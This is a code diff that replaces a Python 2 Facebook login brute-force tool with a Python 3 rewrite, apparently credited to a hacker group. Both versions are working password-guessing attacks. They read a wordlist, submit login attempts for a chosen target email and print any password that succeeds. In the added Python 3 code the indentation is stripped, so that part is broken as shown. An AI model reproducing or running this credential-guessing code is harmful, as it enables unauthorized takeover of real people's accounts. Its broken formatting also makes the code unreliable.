@@ -1,106 +1,75 @@
-#!usr/bin/python
-# -*- coding: utf-8 -*-
+import requests
+import threading
+# import urllib.request
+# import os
+from bs4 import BeautifulSoup
 import sys
-import random
-import mechanize
-import cookielib
-import os
-
-os.system("clear")
-class bcolors:
-    OKGREEN = '\033[92m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    OKBLUE = '\033[94m'
-
-print bcolors.BOLD + ''
-print '\t   # Anon6372098 FB Brute Force'
-print '\t   # Yt Channel : D4RK SYST3M F41LUR3 S33K3R'
-print '\t   # Github: /Anon6372098'
-print '\t   # Team : D4RK SYST3M F41LUR3 S33K3R (DSFS)'
-print '\t   # anon6372098@gmail.com  '
-print '' + bcolors.ENDC
-
-email = str(raw_input("[?] Username | User ID | E-Mail | Phone Number/No.HP :> "))
-passwordlist = str(raw_input("[?] The wordlist name/Nama wordlistnya :> "))
-
-useragents = [('User-agent', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')]
-
-login = 'https://www.facebook.com/login.php?login_attempt=1'
-def attack(password):
-
-  try:
-     sys.stdout.write("\r [*] Denenen şifre: %s " % password)
-     sys.stdout.flush()
-     br.addheaders = [('User-agent', random.choice(useragents))]
-     site = br.open(login)
-     br.select_form(nr=0)
-
-
-     ##Facebook
-     br.form['email'] =email
-     br.form['pass'] = password
-     br.submit()
-     log = br.geturl()
-     if log != login:
-        print bcolors.OKGREEN + "\n\n\n [*] Şifre bulundu!." + bcolors.ENDC
-        print bcolors.WARNING + "\n [*] Şifre: %s\n" % (password) + bcolors.ENDC
-        sys.exit(1)
-  except KeyboardInterrupt:
-        print bcolors.FAIL + "\n[!] Çıkılıyor.. " + bcolors.ENDC
-        sys.exit(1)
-
-def search():
-    global password
-    for password in passwords:
-        attack(password.replace("\n",""))
-
-
-
-def check():
-
-    global br
-    global passwords
-    try:
-       br = mechanize.Browser()
-       cj = cookielib.LWPCookieJar()
-       br.set_handle_robots(False)
-       br.set_handle_equiv(True)
-       br.set_handle_referer(True)
-       br.set_handle_redirect(True)
-       br.set_cookiejar(cj)
-       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-    except KeyboardInterrupt:
-        print bcolors.FAIL + "\n[!] Çıkılıyor.. " + bcolors.ENDC
-        sys.exit(1)
-    try:
-       list = open(passwordlist, "r")
-       passwords = list.readlines()
-       k = 0
-       while k < len(passwords):
-          passwords[k] = passwords[k].strip()
-          k += 1
-    except IOError:
-        print bcolors.FAIL + "\n [!] Hata: Wordlist dosyası bulunamadı! \n"
-        sys.exit(1)
-    except KeyboardInterrupt:
-        print bcolors.FAIL + "\n[!] Çıkılıyor..\n " + bcolors.ENDC
-        sys.exit(1)
-    try:
-        print bcolors.OKBLUE + " [*] Hesap bilgisi : %s" % (email) + bcolors.ENDC
-        print " [*] Şifre sayısı :" , len(passwords), "passwords"
-        print " [*] Üzerinde çalışılıyor, Lütfen bekleyin .."
-    except KeyboardInterrupt:
-        print bcolors.FAIL + "\n[!] Çıkılıyor..\n " + bcolors.ENDC
-        sys.exit(1)
-    try:
-        search()
-        attack(password)
-    except KeyboardInterrupt:
-        print bcolors.FAIL + "\n[!] Çıkılıyor..\n " + bcolors.ENDC
-        sys.exit(1)
-
-if __name__ == '__main__':
-    check()
+try :
+if sys.version_info[ 0 ] < 3 :
+raise "MEMBUTUHKAN/REQUIRED PYTHON 3.x"
+except Exception as ex:
+print ( ''' --------------------------------------
+MEMBUTUHKAN/REQUIRED PYTHON 3.x
+gunakan/use : python3 fb.py
+Send your problems on anon6372098@gmail.com
+#Creator : Anon6372098
+#Email : anon6372098@gmail.com
+#Yt Channel : D4RK SYST3M F41LUR3 S33K3R
+#Github : /Anon6372098
+#Team : D4RK SYST3M F41LUR3 S33K3R (DSFS)
+--------------------------------------
+''' )
+sys.exit()
+post_url = 'https://www.facebook.com/login.php'
+headers = {
+'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, lik
+}
+payload = {}
+cookie = {}
+def create_form ():
+form= dict()
+cookie= { 'fr' : '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy' }
+data= requests.get(post_url, headers = headers)
+# print('Form Creating : ',data.url)
+# print('Return Status : ',data.status_code)
+#for i in data.headers:
+# print(i,' : ',data.headers[i])
+for i in data.cookies:
+cookie[i.name] = i.value
+data= BeautifulSoup(data.text, 'html.parser' ).form
+if data.input[ 'name' ] =='lsd' :
+form[ 'lsd' ] = data.input[ 'value' ]
+return (form,cookie)
+def function(email,passw,i):
+global payload,cookie
+if i % 10==1 :
+payload,cookie = create_form()
+payload[ 'email' ] = email
+payload[ 'pass' ] = passw
+# print(payload)
+# print(cookie)
+# print('lsd : ',payload['lsd'])
+# print(cookie)
+r = requests.post(post_url, data= payload, cookies = cookie, headers = headers)
+if 'Find Friends' in r.text:
+print ( 'password is ' ,passw)
+#open('d.html','w').write(r.text)
+return True
+return False
+#payload=create_form()
+print ( '___________________________________________________________________________\n' )
+file= open( 'passwords.txt' , 'r' )
+i = 0
+email = input ( 'Masukkan/Enter Email : ' )
+print ( "" )
+print ( "Target Email ID : " ,email)
+print ( "" )
+while file:
+passw = file.readline().strip()
+i += 1
+print ( "Trying Password " + str (i) + ": " ,passw)
+if function(email,passw,i):
+break
+# threading.Thread(target=function,args=(email,passw,i)).start()
+# if not i%10:
+# os.system('pause')
